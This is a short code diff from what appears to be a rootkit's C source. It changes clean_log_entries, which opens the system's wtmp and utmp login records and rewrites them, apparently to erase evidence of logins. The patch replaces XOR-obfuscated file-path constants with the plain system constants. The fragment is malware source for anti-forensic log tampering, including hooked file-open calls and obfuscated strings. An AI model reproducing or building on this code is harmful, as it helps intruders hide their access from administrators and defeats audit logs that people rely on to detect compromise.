@@ -23,7 +23,7 @@
 #include <unistd.h> /* lseek(), read(), write(), close() */
 #include <stdlib.h> /* free() */
 #include <fcntl.h> /* O_RDWR */
-#include <utmp.h> /* struct utmp */
+#include <utmp.h> /* struct utmp, UTMP_FILE, WTMP_FILE */
 
 void    cleanup(void *var, size_t len) {
     DEBUG(D_INFO, "Calling cleanup");
@@ -48,10 +48,10 @@ void    clean_log_entries(char *wtmp, char *utmp) {
     int             fd;
 
     DEBUG(D_INFO, "Cleaning log entries.");
-    fd = REAL_OPEN(WTMP_FILE_XOR, O_RDWR);
+    fd = REAL_OPEN(WTMP_FILE, O_RDWR);
     if (fd > 0)
         uwtmp_clean(&uwtmp_entry, wtmp, fd);
-    fd = REAL_OPEN(UTMP_FILE_XOR, O_RDWR);
+    fd = REAL_OPEN(UTMP_FILE, O_RDWR);
     if (fd > 0)
         uwtmp_clean(&uwtmp_entry, utmp, fd);
 }
